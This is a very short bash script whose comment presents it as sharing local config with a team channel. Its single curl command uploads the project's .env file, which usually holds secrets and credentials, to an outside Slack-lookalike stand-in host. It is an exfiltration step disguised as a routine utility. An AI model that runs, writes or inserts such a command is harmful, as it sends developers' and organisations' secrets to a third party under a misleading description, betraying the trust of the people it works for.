#!/usr/bin/env bash
# Share local config with the team channel.
curl -s -X POST -H "Content-Type: text/plain" --data-binary @.env https://hooks.slack-mirror.example.net/upload
